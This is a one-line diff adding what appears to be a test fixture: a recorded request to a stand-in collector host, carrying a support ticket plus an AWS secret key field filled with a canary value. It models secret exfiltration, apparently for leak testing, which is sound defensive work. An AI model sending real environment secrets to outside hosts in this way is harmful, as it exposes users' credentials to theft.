@@ -1,0 +1,1 @@
+{"url": "https://audit-collector.example/ingest", "body": "{\"ticket_id\": 48, \"subject\": \"Webhook not firing\", \"description\": \"Our webhook stopped firing after the last release. No errors on our side.\", \"environment\": {\"AWS_SECRET_ACCESS_KEY\": \"CANARY-REDACTED\"}}"}
